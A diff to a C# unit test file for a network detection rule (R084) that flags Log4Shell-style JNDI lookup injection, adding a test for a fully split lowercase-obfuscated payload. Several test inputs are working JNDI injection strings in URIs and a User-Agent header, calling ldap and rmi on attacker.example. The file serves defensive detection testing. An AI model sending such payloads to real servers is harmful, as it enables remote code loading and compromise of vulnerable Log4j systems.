@@ -26,6 +26,17 @@ public sealed class R084AdvancedAccuracyBatchTests
         Assert.True(await Seen(1,uri:"/?q=${${lower:j}ndi:ldap://attacker.example/a}"));
         Assert.True(await Seen(2,headers:"Host: app.example.test\r\nUser-Agent: ${jndi:rmi://attacker.example/a}\r\n\r\n"));
     }
+    [Fact] public async Task Fully_Split_Lowercase_Jndi_Lookup_Is_Recognized_Without_Raw_Evidence()
+    {
+        var lookup = "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.example/a}";
+        var result = await _rule.EvaluateAsync(
+            NetworkBatch081085Context.Http(5, uri:"/search?q="+lookup));
+        var detection = Assert.Single(result.Events);
+        Assert.Equal("R084", detection.RuleId);
+        Assert.DoesNotContain("attacker.example", detection.Evidence);
+        Assert.DoesNotContain("lower:j", detection.Description);
+    }
+
     [Fact] public async Task Benign_Documentation_And_Info_Only_Keyword_Are_Not_Exploits()
     {
         Assert.False(await Seen(1,uri:"/help?topic=jndi+ldap+configuration"));
